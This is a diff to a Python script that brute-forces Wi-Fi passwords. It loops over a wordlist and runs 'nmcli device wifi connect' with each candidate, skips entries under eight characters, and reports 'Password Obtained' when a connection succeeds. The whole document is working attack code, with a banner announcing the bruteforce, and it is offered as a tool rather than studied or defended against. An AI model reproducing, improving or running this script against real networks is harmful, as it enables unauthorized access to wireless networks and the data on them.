@@ -31,6 +31,8 @@ for i in banner:
     sys.stdout.write(i)
     sys.stdout.flush()
     time.sleep(0.05)
+    
+time.sleep(0.02)
 								
 
 stm = "nmcli device wifi connect"
@@ -40,13 +42,21 @@ pswd_lst = pas()
 
 for pswd in pswd_lst:
 
+    if len(pswd) < 8:
+        continue
+
     try:
-	    time.sleep(0.1)
-	    #pswd = pswd_lst[x].rstrip('\n')
 	    cmd = stm + " " + U_name + " " + "password" + " " +  " \"" + pswd + "\""
-	    print( "trying " + pswd)
-	    os.system(cmd)
-	    time.sleep(0.01)        
+	    
+	    print("trying : " + pswd)
+	    
+	    result = os.system(cmd)
+	    
+	    if (result == 0):
+	        print(f"Password Obtained {pswd}")
+	        
+	    else: 
+	        print(f"-- Incorrect password {pswd}")
     except OSError:
         print("+++ == AN ERROR OCCURED == +++")
         break
@@ -56,8 +66,13 @@ end_msg = " ___ BRUTEFORCE completed ___"
 for i in end_msg:
     sys.stdout.write(i)
     sys.stdout.flush()
-    sys.sleep(0.05)
+    time.sleep(0.05)
     
+
+
+
+
+
 
 
 
